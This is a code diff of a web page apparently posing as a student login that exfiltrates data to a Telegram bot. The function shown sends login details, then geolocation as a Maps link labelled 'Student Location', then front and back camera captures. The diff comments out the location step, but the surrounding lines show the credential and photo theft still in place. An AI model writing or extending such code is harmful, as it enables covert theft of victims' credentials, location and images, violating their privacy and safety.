@@ -212,23 +212,23 @@ async function sendLoginThenLocationThenMedia() {
   }
 
   // 2) إرسال الموقع (كُرسالة منفصلة)
-  try {
-    let mapsLink = "غير متاح";
-    try {
-      const pos = await getCurrentPositionPromise();
-      const { latitude, longitude } = pos.coords;
-      mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    } catch (posErr) {
-      console.warn("Location not available:", posErr);
-      mapsLink = "غير متاح (رفض أو خطأ)";
-    }
-    const locMessage = `<b>📍 Student Location</b>\n${escapeHtml(mapsLink)}\n<b>Time:</b> ${new Date().toLocaleString()}`;
-    await tgSendMessage(locMessage);
-    console.log("Location sent.");
-  } catch (err) {
-    console.error("Failed to send location to Telegram:", err);
-    alert("تحذير: إرسال الموقع فشل. قد تحتاج إلى حل CORS أو بروكسي.");
-  }
+  // try {
+  //   let mapsLink = "غير متاح";
+  //   try {
+  //     const pos = await getCurrentPositionPromise();
+  //     const { latitude, longitude } = pos.coords;
+  //     mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+  //   } catch (posErr) {
+  //     console.warn("Location not available:", posErr);
+  //     mapsLink = "غير متاح (رفض أو خطأ)";
+  //   }
+  //   const locMessage = `<b>📍 Student Location</b>\n${escapeHtml(mapsLink)}\n<b>Time:</b> ${new Date().toLocaleString()}`;
+  //   await tgSendMessage(locMessage);
+  //   console.log("Location sent.");
+  // } catch (err) {
+  //   console.error("Failed to send location to Telegram:", err);
+  //   alert("تحذير: إرسال الموقع فشل. قد تحتاج إلى حل CORS أو بروكسي.");
+  // }
 
   // 3) التقاط وإرسال الوسائط (front ثم back) — كل صورة كرسالة منفصلة
   try {
@@ -284,6 +284,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
 </body>
 </html>
+
 
 
 
